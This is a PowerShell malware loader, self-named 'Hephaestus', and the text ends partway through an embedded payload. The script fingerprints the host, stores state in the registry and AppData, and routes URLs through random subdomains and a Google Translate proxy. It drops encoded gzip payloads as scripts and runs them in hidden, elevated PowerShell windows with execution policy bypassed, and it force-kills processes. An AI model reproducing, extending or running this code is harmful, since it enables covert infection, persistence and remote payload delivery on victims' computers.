function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$machineCode = ""

function Get-MachineCode {

    if ([string]::IsNullOrEmpty($machineCode) -eq $false)
    {
        return $machineCode
    }
    try {
        $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
        $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
    
        $combinedString = "$biosSerial$mbSerial$macAddress"
    
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
        $hashBytes = $sha256.ComputeHash($bytes)
    
        # Convert to Base64 and take the first 12 characters
        $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
        
        $machineCode = $hashString.Substring(0, 12)
    }
    catch 
    {
        $machineCode = "Hephaestus"
    }
    return $machineCode
}

$hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"

$globalDebug = IsDebug;

function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )
    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)

        $memoryStream = New-Object System.IO.MemoryStream(,$decodedBytes)
        $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
        $outputStream = New-Object System.IO.MemoryStream

        $gzipStream.CopyTo($outputStream)
        $gzipStream.Close()
        $memoryStream.Close()

        [System.IO.File]::WriteAllBytes($outFile, $outputStream.ToArray())
    }
    catch {
        writedbg "Failed to decode to file $outFile and decompress: $_"
    }
}

function Get-SHA256HashBase64 {
    param ([string]$inputString)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $byteArray = [System.Text.Encoding]::UTF8.GetBytes($inputString)
    $hashBytes = $sha256.ComputeHash($byteArray)
    return [Convert]::ToBase64String($hashBytes)
}

function CustomDecodeEnveloped {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $parsed = $inContent | ConvertFrom-Json
    $evalHash = Get-SHA256HashBase64($parsed.json)
    if ($evalHash -ne $parsed.hash)
    {
        throw "Wrong Hash";
    }
    return CustomDecode -inContent $parsed.json -outFile $outFile
}

function EnvelopeIt {
    param ([string]$inputString)
    
    $hash = Get-SHA256HashBase64 -inputString $inputString
    
    $envelope = @{
        json = $inputString
        hash = $hash
    }
    
    return ($envelope | ConvertTo-Json)
}

function ModifyUrl {
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    

    if ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
    }
    else
    {
        $domainParts = @(Get-RandomString) + $domainParts
    }
    $newHost = ($domainParts -join '.')
    
    $newQuery = $uri.Query
    $randomArg = "xxx=" + (Get-RandomString)
    
    if ($newQuery) {
        if ($newQuery.StartsWith('?')) {
            $newQuery = "?" + $randomArg + "&" + $newQuery.Substring(1)
        }
    } else {
        $newQuery = "?" + $randomArg
    }
    
    if ($uri.Port -ne 80 -and $uri.Port -ne 443) {
        $newUrl = $uri.Scheme + "://" + $newHost + ":" + $uri.Port + $uri.AbsolutePath + $newQuery
    } else {
        $newUrl = $uri.Scheme + "://" + $newHost + $uri.AbsolutePath + $newQuery
    }
    
    return $newUrl
}

function GoogleUrl{
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    
    if ($domainParts.Length -gt 2) {
        $newHost = $domainParts[0] + '-' + $domainParts[1] + '-' + $domainParts[2]
    } else {
        $newHost = $domainParts[0] + '-' + $domainParts[1]
    }

    $newUrl = "https://" + $newHost + ".translate.goog" + $uri.AbsolutePath + "?_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ja&_x_tr_hl=ru&_x_tr_pto=wapp"
    
    return $newUrl
}


function Get-RandomString {
    $length = 8
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((0..($length-1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}


function SmartServerlUrl{
    param ([string]$url)
         $url = ModifyUrl -url $url
         return $url
}


function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath $($(Get-MachineCode))
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 


function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function GetArg {
    param ([string]$arg)

    $globalArgs = $global:args
    $arg = $arg.ToLower()

    for ($i = 0; $i -lt $globalArgs.Count; $i++) {
        $currentArg = $globalArgs[$i].TrimStart("-").ToLower()
        if ( (ArgsEqual $currentArg $arg) -and $i + 1 -lt $globalArgs.Count) {
            return $globalArgs[$i + 1]
        }
    }

    return ""
}

function StrToInt {
    param ([string]$value)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return 0
    }

    $intValue = 0
    if ([int]::TryParse($value, [ref]$intValue)) {
        return $intValue
    }

    return 0
}

function StrToBool {
    param ([string]$value, [bool]$default)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $default
    }

    $boolValue = $default
    if ([bool]::TryParse($value.ToLower(), [ref]$boolValue)) {
        return $boolValue
    }

    return $default
}

function RegWrite {
    param (
        [string]$registryPath,
        [string]$keyName,
        [string]$value
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $value) {
                writedbg "The '$keyName' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $value
                writedbg "'$keyName' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value "$value" -PropertyType String -Force | Out-Null
            writedbg "'$keyName' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the '$keyName' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function RegWriteInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )

    RegWrite -registryPath $registryPath -keyName $keyName -value $value.ToString()
}

function RegRead {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue
            $res = $currentValue.$keyName
            if ($null -eq $res)
            {
                $res = "";
            }
            return $res
        }
    } catch {
        writedbg "Error reading registry key '$keyName' from '$registryPath': $($_.Exception.Message)" -ForegroundColor Red
    }

    return ""
}

function RegReadInt {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToInt -value $value
}

function RegReadBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$default
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToBool -value $value -default $default
}

function RegWriteParam {
    param (
        [string]$keyName,
        [string]$value
    )
    $registryPath = $hepaestusReg
    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function RegWriteParamInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString()
}

function RegWriteParamBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString().ToLower()
}

function RegReadParam {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegRead -registryPath $registryPath -keyName $keyName
}

function RegReadParamInt {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegReadInt -registryPath $registryPath -keyName $keyName
}

function RegReadParamBool {
    param (
        [string]$keyName,        [bool]$default
    )
    $registryPath = $hepaestusReg
    return RegReadBool -registryPath $registryPath -keyName $keyName -default $default
}

function GetArgInt {
    param ([string]$arg)

    return StrToInt (GetArg $arg)
}

function EnsureDashPrefix {
    param ([string]$value)

    if (-not $value.StartsWith("-")) {
        return "-" + $value
    }
    return $value
}

function ArgsEqual {
    param (
        [string]$arg1,
        [string]$arg2
    )

    # Normalize both arguments (remove leading "-" and compare case-insensitively)
    $normalizedArg1 = $arg1.TrimStart("-").ToLower()
    $normalizedArg2 = $arg2.TrimStart("-").ToLower()

    return $normalizedArg1 -eq $normalizedArg2
}

function RunMe {
    param (
        [string]$script, 
        [bool] $repassArgs,
        [string]$argName,
        [string]$argValue,
        [bool]$uac
    )

    $argName = EnsureDashPrefix -value $argName

    $scriptPath = $script
    
    $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
    
    if ($repassArgs -eq $true) {
        $globalArgs = $global:args
        $filteredArgs = @()
        $skipNext = $false

        for ($i = 0; $i -lt $globalArgs.Count; $i++) {
            if ($skipNext) 
            {
                $skipNext = $false
                continue
            }

            if (ArgsEqual $globalArgs[$i] $argName) {
                $skipNext = $true
                continue
            }

            $filteredArgs += $globalArgs[$i]
        }
        $globalArgs = $filteredArgs
        $local += $globalArgs
        if (-not [string]::IsNullOrEmpty($argName) -and $argName -ne "-") {
            $local += $argName
            $local += $argValue
        }
    }

    $argumentList = ""
    for ($i = 0; $i -lt $local.Count; $i += 1) {
        $arg = $local[$i]
        $argumentList += "$arg "
    }

    writedbg "starting  $argumentList"

    if ($globalDebug)
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Normal -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Normal -ArgumentList $argumentList
        }
    }
    else 
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $argumentList
        }
    }

}

function IsElevatedOld
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}

function IsElevated {
    $winID = [Security.Principal.WindowsIdentity]::GetCurrent()
    $princ = New-Object Security.Principal.WindowsPrincipal($winID)
    return $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -and $winID.Owner -ne $winID.User
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}



###head


###head


function GetLocalScriptPath {
    param
    (

    [Parameter(Mandatory = $true)]
    [string[]]
    $taskName
    )
    $scriptPath = Get-HephaestusFolder
    $fullPath = Join-Path -Path $scriptPath -ChildPath "$taskName.ps1"
    return $fullPath
}

function Save-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName,

        [Parameter(Mandatory = $true)]
        [string[]]
        $body
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    CustomDecode -inContent $body -outFile $scriptPath
    return $fullPath
}

function Invoke-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    if ($globalDebug)
    {
        Start-Process powershell.exe -WindowStyle Normal -ArgumentList "-ExecutionPolicy Bypass -file ""$scriptPath"" -Task $taskName"
    }
    else
    {
        Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`" -Task $taskName"
    }
}

$global:Task = $null

for ($i = 0; $i -lt $args.Count; $i++) {
    if ($args[$i] -eq '-Task') {
        if ($i + 1 -lt $args.Count) {
            $global:Task = $args[$i + 1]
        } else {
            writedbg "No value provided for -Task argument."
        }
    }
}

function Main 
{
    $showPath = GetLocalScriptPath -taskName "program"
    writedbg "program curScript: $showPath"

    if ($global:Task) {
        writedbg "Task - $task"
        & $global:Task
    } else 
    {               

   
        $tasks = @{
               "startdownloads" = "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"
    "dnsman" = "H4sIAAAAAAAACtVbeXPbtrb/PzP5DhhWcyXVJmM5SxN1NK0iO4l64+VacvxeXb0MREISYpJgQdC2mua73zkASAIkZTlbZ54yE0tYzoZzfgAOgAtOBXHfsFSgdhCnEY7bDx8sstgXlMVonB6QebZEHx8+QAihVgC/XtGQoAFyRv0/5G9P3ApHNVD/C77Oe8DnBzRaEf8K0QUSK4IW0J3c0lSkZRu6QJ0pSYV7isXK5CMLpuuEoLcEL7omXfhwIjIeo5bgGSlrPiESpmRT2wUOU7Ox+voJ+Vj4q4rgsgjHa0Q4ZzxFYoUFYr6fcRRknMZLqVIpOUsIx2C6kkoD208PH3x6+ODhg1aE/RWNyYgF0qIOFBbGf02Ee2Q0+Ai1ubEuUwHsZ/3+OD3OwvCEH0aJWHdMkl3kkj81467q+rEul9GhkK5hFFtzytIJ4RSHaIA6INxFRE/mH4gv0AWNH++/fzk+mXQ91eY4i+aEG92j+ZbOOCUvGebBZgrYHwYBJ2m6icYxETeMXw0DnAjCRyxe0GWmxgP9jS5WhBNXd/iIWu+9o+Eop+jiOICi8elhjOchCdCnrlF/uTczPVzK47NoTmMSTORIwPgZNir0NcR2aiTSFd5/+gwN0OVknQoSeRPiZ5yKtTfi60SwJcfJau1N3gz3nz6b9fsjTrAgna45LGtBUoPClNwK7zD2WaDc43z66rn3moiX0K5TEdoktMLpSjZCg1wwb8SiJBPkDU5XHcVJ97CChMXXhAskGIJBfPYEgS0FviI63nkqUG8f+SvMsS8ITytcCwNealKzfn/KFC1V1yml6yKXkyTEPkHO5f9h96+h+/ue+2Lm7CLHAXHOSMSuCYpZ7OIwWeE4iwinfiN727uMUDTk8ibZXAVbZ28X9fa7VpQo0KgFVzWy35BkhUkqstwJdPfGIFTYsCKJ6nFGpHO9+ffovP/HhC3EDebkj1an1akgRLcrAaS1DNkchwq5Bzm